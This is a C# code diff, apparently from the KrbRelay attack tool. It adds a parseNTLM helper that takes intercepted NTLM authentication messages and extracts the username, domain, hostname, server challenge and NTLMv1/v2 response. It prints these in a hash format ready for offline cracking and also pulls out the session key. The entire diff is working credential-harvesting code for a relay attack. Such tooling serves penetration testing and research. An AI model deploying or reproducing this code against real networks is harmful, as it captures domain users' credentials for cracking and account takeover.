@@ -12,6 +12,49 @@ namespace KrbRelay
     internal class Helpers
     {
 
+        public static string parseNTLM(byte[] ntlm2, byte[] ntlm3)
+        {
+            int ntlm3Pattern = Helpers.PatternAt(ntlm3, new byte[] { 0x4e, 0x54 });
+            ntlm3 = ntlm3.Skip(ntlm3Pattern).ToArray();
+            
+            ushort ntlmv3_len = BitConverter.ToUInt16(ntlm3, 20);
+            int domainLen = BitConverter.ToUInt16(ntlm3.Skip(28).Take(2).ToArray(), 0);
+            int userLen = BitConverter.ToUInt16(ntlm3.Skip(36).Take(2).ToArray(), 0);
+            int hostnameLen = BitConverter.ToUInt16(ntlm3.Skip(44).Take(2).ToArray(), 0);
+            int domainOffset = BitConverter.ToInt32(ntlm3.Skip(32).Take(4).ToArray(), 0);
+            int userOffset = BitConverter.ToInt32(ntlm3.Skip(40).Take(4).ToArray(), 0);
+            int hostnameOffset = BitConverter.ToInt32(ntlm3.Skip(48).Take(4).ToArray(), 0);
+            string domain = Encoding.Unicode.GetString(ntlm3.Skip(domainOffset).Take(domainLen).ToArray());
+            string user = Encoding.Unicode.GetString(ntlm3.Skip(userOffset).Take(userLen).ToArray());
+            string hostname = Encoding.Unicode.GetString(ntlm3.Skip(hostnameOffset).Take(hostnameLen).ToArray());
+            string challenge = Helpers.ByteArrayToString(ntlm2.Skip(24).Take(8).ToArray());
+            string part1;
+            string part2;
+            if (ntlmv3_len == 24)
+            {
+                int LmType3Offset = BitConverter.ToUInt16(ntlm3.Skip(16).Take(2).ToArray(), 0);
+                int ntlmType3Offset = BitConverter.ToUInt16(ntlm3.Skip(24).Take(2).ToArray(), 0);
+                part1 = Helpers.ByteArrayToString(ntlm3.Skip(LmType3Offset).Take(24).ToArray());
+                part2 = Helpers.ByteArrayToString(ntlm3.Skip(ntlmType3Offset).Take(24).ToArray());
+            }
+            else
+            {
+                int ntlmType3Length = BitConverter.ToUInt16(ntlm3.Skip(20).Take(2).ToArray(), 0);
+                int ntlmType3Offset = BitConverter.ToUInt16(ntlm3.Skip(24).Take(2).ToArray(), 0);
+                part1 = Helpers.ByteArrayToString(ntlm3.Skip(ntlmType3Offset).Take(16).ToArray());
+                part2 = Helpers.ByteArrayToString(ntlm3.Skip(ntlmType3Offset + 16).Take(ntlmType3Length - 16).ToArray());
+            }
+            Console.WriteLine("[*] NTLM3");
+            Console.WriteLine(user + "::" + domain + ":" + challenge + ":" + part1 + ":" + part2);
+
+            //session key
+            //Console.WriteLine("[*] NTLM3dump");
+            //Console.WriteLine(Helpers.ByteArrayToString(ntlm3));
+            byte[] session_key = ntlm3.Skip(52).Take(8).ToArray();
+            //Console.WriteLine(Helpers.ByteArrayToString(session_key));
+
+            return user + "::" + domain + ":" + challenge + ":" + part1 + ":" + part2;
+        }
 
         //https://github.com/rvazarkar/GMSAPasswordReader
         public static string KerberosPasswordHash(Interop.KERB_ETYPE etype, string password, string salt = "", int count = 4096)
